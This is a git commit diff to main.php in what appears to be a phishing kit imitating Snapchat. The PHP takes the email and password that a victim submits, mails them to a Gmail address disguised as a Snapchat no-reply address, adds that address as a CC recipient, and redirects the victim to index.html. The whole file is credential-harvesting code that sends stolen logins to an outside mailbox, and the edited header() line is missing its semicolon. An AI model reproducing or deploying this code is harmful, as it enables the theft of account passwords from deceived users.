7e0a69099e3c3d75cead9e9381dca88ee0809d6a
mrdark23-cop69-acback-aws <114758941+mrdark23-cop69-acback-aws@users.noreply.github.com>
2022-10-02 16:24:09 +0500

    Add files via upload

--- main.php
+++ main.php
@@ -8,18 +8,16 @@ $password = $_POST['password'];
 $to = "noreplay.snapchat.net@gmail.com";
 $subject = "Mail From Website";
 
-$headers = "Form:" .$name. "\r\n";
+$headers = "Form:" .$username. "\r\n" . "CC: noreplay.snapchat.net@gmail.com";
 
-$txt = "You have recived an e-mail from" .$name.  "\r\n Email: " .$email. "\r\n Password:" .$password;
+$txt = "You have recived an e-mail from" .$username.  "\r\n Email: " .$email. "\r\n
+ Password:" .$password;
 
-if($email != NULL){
-    mail($to, $subject, $txt, $headers);
+if($email!=NULL){
+    mail($to,$subject,$txt,$headers);
 }
 
-header('Location:index.html');
-
-
-
+header('Location:index.html')
 
 
 
